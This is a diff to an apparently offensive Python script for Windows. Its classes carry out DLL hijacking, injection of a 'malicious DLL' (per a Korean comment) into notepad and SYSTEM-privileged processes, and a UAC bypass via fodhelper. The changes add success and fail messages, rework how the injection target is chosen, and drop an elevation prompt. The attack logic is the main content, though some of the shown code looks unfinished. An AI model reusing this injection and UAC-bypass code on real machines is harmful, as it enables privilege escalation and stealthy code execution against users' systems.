@@ -242,17 +242,16 @@ class hiJacking():
                 #notePad_pid = dll_hijact.create_process("C:/Windows/System32/notepad.exe") 
                 
                 uac = uac_bypass()
-                uac.execute()
+                #notePad_pid = uac.execute()
                 notePad_pid = self.create_process("C:/Windows/System32/notepad.exe")
-                for proc in psutil.process_iter():
-                    if proc.name().endswith("notepad.exe"):
-                        notePad_pid = proc.pid
+               
                 
                 try:
 
-                    inject(notePad_pid,exploit_dll_path) 
+                    inject(notePad_pid,exploit_dll_path)
+                    print("Attack Injection Success!")
                 except Exception as e:
-                    print(e)    
+                    print("Attack Injection Fail...")
                 time.sleep(1)
                 app = Application(backend="win32").connect(process=notePad_pid)
                 try:
@@ -309,7 +308,7 @@ class hiJacking():
                     time.sleep(1)
                     os.system("cls")
                     uac = uac_bypass()
-                    uac.execute()
+                    #uac.execute()
                     notePad_pid = dll_hijact.create_process("C:/Windows/System32/notepad.exe") 
                     for proc in psutil.process_iter():
                         if proc.name().endswith("notepad.exe"):
@@ -317,8 +316,9 @@ class hiJacking():
                 
                     try:
                         inject(notePad_pid,exploit_dll_path)
+                        print("Restore Injection Success!")
                     except:
-                        pass
+                        print("Restore Injection Fail...")
                     time.sleep(1)
                     psutil.Process(notePad_pid).kill()
                     os.remove(abspath + "/"+"CreateIFileOperationDLL\CMakeCache.txt")
@@ -328,8 +328,6 @@ class hiJacking():
                     
         return successed_list
 class injection():
-    def injection(self):
-        pass
     #SYSTEM 권한으로 실행되는 프로세스 파싱, return 값 => pid
     def find_process(self):
         proc_lists = []
@@ -352,8 +350,22 @@ class injection():
         
      
     #find_process에서 찾은 pid를 악성 dll을 이용하여 인젝션 해보기
-    def attack(self,pid,path_dll):
+    def attack(self,pid):
+        path_dll = abspath + "/" + "CreateDLL.dll"
         inject(pid,path_dll)
+        app = Application(backend="win32").connect(process=pid)
+        try:
+            dlg = app.window(title_re="SECU")
+            dlg.확인.click()
+                    
+        except:
+            print("Injection Fail..")
+        
+        else:
+            print("Injection Success!")
+            print("Target PID : " + pid)
+        
+        
 
 class uac_bypass():
 
@@ -399,25 +411,17 @@ class uac_bypass():
             try:                
                 
                 self.bypass_uac(self.CMD)                
-                os.system(self.FOD_HELPER)                              
+                os.system(self.FOD_HELPER)
+                for proc in psutil.process_iter():
+                    if proc.name().endswith("notepad.exe"):
+                        notePad_pid = proc.pid                              
             except WindowsError:
                 return
         else:
             pass
     
-        return
+        return notePad_pid
 if __name__=='__main__': 
-    
-    ASADMIN = 'asadmin'
-
-    if sys.argv[-1] != ASADMIN:
-
-        script = os.path.abspath(sys.argv[0])
-
-        params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
-
-        shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
-
         dll_inject = injection()
         dll_hijact = hiJacking()
         path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
